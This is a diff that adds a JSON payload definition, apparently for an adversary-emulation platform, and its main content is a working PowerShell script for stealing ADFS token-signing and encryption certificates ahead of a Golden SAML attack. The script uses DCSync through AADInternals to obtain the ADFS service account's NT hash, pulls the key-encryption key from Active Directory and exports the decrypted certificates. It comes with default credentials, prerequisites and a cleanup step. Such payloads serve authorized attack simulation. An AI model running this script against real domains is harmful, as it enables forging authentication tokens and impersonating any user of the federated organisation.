@@ -1,0 +1,85 @@
+{
+  "export_version": 1,
+  "native_collection": true,
+  "payload_information": {
+    "payload_type": "Command",
+    "payload_name": "ADFS token signing and encryption certificates theft - Remote",
+    "payload_description": "Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as a Domain Administrators user on a domain-joined computer.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_attack_patterns": [
+      {
+        "attack_pattern_id": "f339328d-1b5f-430f-a4c6-cb46d18ee79b",
+        "attack_pattern_name": "Private Keys",
+        "attack_pattern_description": "Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.(Citation: Kaspersky Careto)(Citation: Palo Alto Prince of Persia)\n\nWhen a device is registered to Entra ID, a device key and a transport key are generated and used to verify the device’s identity.(Citation: Microsoft Primary Refresh Token) An adversary with access to the device may be able to export the keys in order to impersonate the device.(Citation: AADInternals Azure AD Device Identities)\n\nOn network devices, private keys may be exported via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `crypto pki export`.(Citation: cisco_deploy_rsa_keys) \n\nSome private keys require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line. These private keys can be used to authenticate to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email.",
+        "attack_pattern_external_id": "T1552.004",
+        "attack_pattern_kill_chain_phases": null
+      }
+    ],
+    "payload_cleanup_executor": "psh",
+    "payload_cleanup_command": "Remove-Item -Path \".\\ADFS_encryption.pfx\" -ErrorAction Ignore\nRemove-Item -Path \".\\ADFS_signing.pfx\" -ErrorAction Ignore\n",
+    "payload_elevation_required": false,
+    "payload_arguments": [
+      {
+        "type": "text",
+        "key": "adfs_service_account_name",
+        "default_value": "adfs_svc",
+        "description": null,
+        "separator": null
+      },
+      {
+        "type": "text",
+        "key": "replication_user",
+        "default_value": "Administrator",
+        "description": null,
+        "separator": null
+      },
+      {
+        "type": "text",
+        "key": "replication_password",
+        "default_value": "ReallyStrongPassword",
+        "description": null,
+        "separator": null
+      },
+      {
+        "type": "text",
+        "key": "adfs_server_name",
+        "default_value": "sts.contoso.com",
+        "description": null,
+        "separator": null
+      }
+    ],
+    "payload_prerequisites": [
+      {
+        "executor": "psh",
+        "get_command": "Install-Module -Name AADInternals -Force\n",
+        "check_command": "if ($(Get-Module AADInternals) -or $(Get-Module -ListAvailable -Name ActiveDirectory)) {echo 0} else {echo 1}\n",
+        "description": "AADInternals and ActiveDirectory modules must be installed.\n"
+      }
+    ],
+    "payload_external_id": "cab413d8-9e4a-4b8d-9b84-c985bd73a442",
+    "payload_source": "FILIGRAN",
+    "payload_expectations": null,
+    "payload_status": "VERIFIED",
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_detection_remediations": [],
+    "payload_tags": [],
+    "payload_output_parsers": [],
+    "payload_created_at": "2025-06-20T09:48:29.729751Z",
+    "payload_updated_at": "2025-06-20T10:17:12.666754Z",
+    "command_executor": "psh",
+    "command_content": "Import-Module ActiveDirectory -Force \nImport-Module AADInternals -Force | Out-Null\n#Get Configuration\n$dcServerName = (Get-ADDomainController).HostName\n$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"#{adfs_service_account_name}\"\n$PWord = ConvertTo-SecureString -String \"#{replication_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{replication_user}, $PWord\n# use DCSync to fetch the ADFS service account's NT hash\n$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex\n$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server #{adfs_server_name}\n# Get certificates decryption key\n$Configuration = [xml]$ADFSConfig\n$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\n$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\n$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\n$base = \"LDAP://CN=$group,$container,$parent\"\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\n$ADSearch.Filter = '(name=CryptoPolicy)'\n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null\n$aduser = $ADSearch.FindOne()\n$keyObjectGuid = $ADUser.Properties[\"displayName\"] \n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\n$aduser=$ADSearch.FindOne() \n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \n# Get encrypted certificates from configuration and decrypt them\nExport-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n"
+  },
+  "payload_tags": [],
+  "payload_attack_patterns": [
+    {
+      "attack_pattern_id": "f339328d-1b5f-430f-a4c6-cb46d18ee79b",
+      "attack_pattern_name": "Private Keys",
+      "attack_pattern_description": "Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.(Citation: Kaspersky Careto)(Citation: Palo Alto Prince of Persia)\n\nWhen a device is registered to Entra ID, a device key and a transport key are generated and used to verify the device’s identity.(Citation: Microsoft Primary Refresh Token) An adversary with access to the device may be able to export the keys in order to impersonate the device.(Citation: AADInternals Azure AD Device Identities)\n\nOn network devices, private keys may be exported via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `crypto pki export`.(Citation: cisco_deploy_rsa_keys) \n\nSome private keys require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line. These private keys can be used to authenticate to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email.",
+      "attack_pattern_external_id": "T1552.004",
+      "attack_pattern_kill_chain_phases": null
+    }
+  ],
+  "payload_arguments_documents": []
+}
